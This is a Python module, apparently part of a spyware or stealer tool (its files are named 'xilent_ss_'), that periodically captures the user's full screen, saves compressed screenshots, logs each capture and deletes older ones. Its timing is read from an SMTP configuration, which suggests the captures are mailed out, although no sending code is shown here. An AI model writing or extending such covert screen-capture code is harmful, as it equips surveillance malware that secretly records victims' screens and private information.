import os
import time
from datetime import datetime
from pathlib import Path
import pyautogui
from PIL import ImageGrab
from .SMTP_config import SCREENSHOT_DIR, LOGGER_HEADER, SMTP_CONFIG
import logging

class ScreenshotCapturer:
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.last_capture_time = 0
        self._setup_environment()
        
    def _setup_environment(self):
        try:
            if not SCREENSHOT_DIR.exists():
                SCREENSHOT_DIR.mkdir(exist_ok=True)
            
                    
            # Archivo de registro de actividad
            self.activity_log = SCREENSHOT_DIR / "screenshots_log.txt"
            
        except Exception as e:
            self.logger.error(f"Error configurando entorno: {str(e)}")
            raise

    def _log_activity(self, filename):
        with open(self.activity_log, "a", encoding='utf-8') as f:
            f.write(f"{datetime.now()}: Captura guardada como {filename}\n")

    def capture(self):
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
            filename = SCREENSHOT_DIR / f"xilent_ss_{timestamp}.png"
            
            try:
                screenshot = pyautogui.screenshot()
            except Exception as pyautogui_error:
                self.logger.warning(f"PyAutoGUI falló, usando PIL: {str(pyautogui_error)}")
                screenshot = ImageGrab.grab(all_screens=True)
                
            screenshot.save(filename, quality=70)  # Calidad reducida para ahorro de espacio
            self._log_activity(filename.name)
            return filename
            
        except Exception as e:
            self.logger.error(f"Error en captura de pantalla: {str(e)}")
            return None

    def capture_periodic(self):
        current_time = time.time()
        if current_time - self.last_capture_time >= SMTP_CONFIG.get('screenshot_interval', 10):
            self.last_capture_time = current_time
            return self.capture()
        return None

    def cleanup_old_files(self, max_files=20):
        try:
            screenshots = sorted(SCREENSHOT_DIR.glob("*.png"), key=os.path.getmtime)
            if len(screenshots) > max_files:
                for old_ss in screenshots[:-max_files]:
                    old_ss.unlink()
        except Exception as e:
            self.logger.error(f"Error limpiando archivos: {str(e)}")